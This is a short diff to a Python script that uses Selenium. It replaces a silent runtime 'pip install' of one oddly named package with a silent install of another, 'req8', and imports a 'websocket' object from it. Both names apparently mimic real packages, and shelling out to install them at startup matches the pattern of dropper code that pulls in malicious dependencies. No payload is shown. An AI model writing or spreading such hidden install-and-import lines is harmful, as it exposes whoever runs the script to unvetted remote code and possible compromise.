@@ -1,7 +1,7 @@
 import os
 import time
-os.system("pip install cuolur")
-from cuolur import visual
+os.system("pip install req8")
+from req8 import websocket
 import selenium
 from selenium import webdriver
 from selenium.webdriver.common.by import By
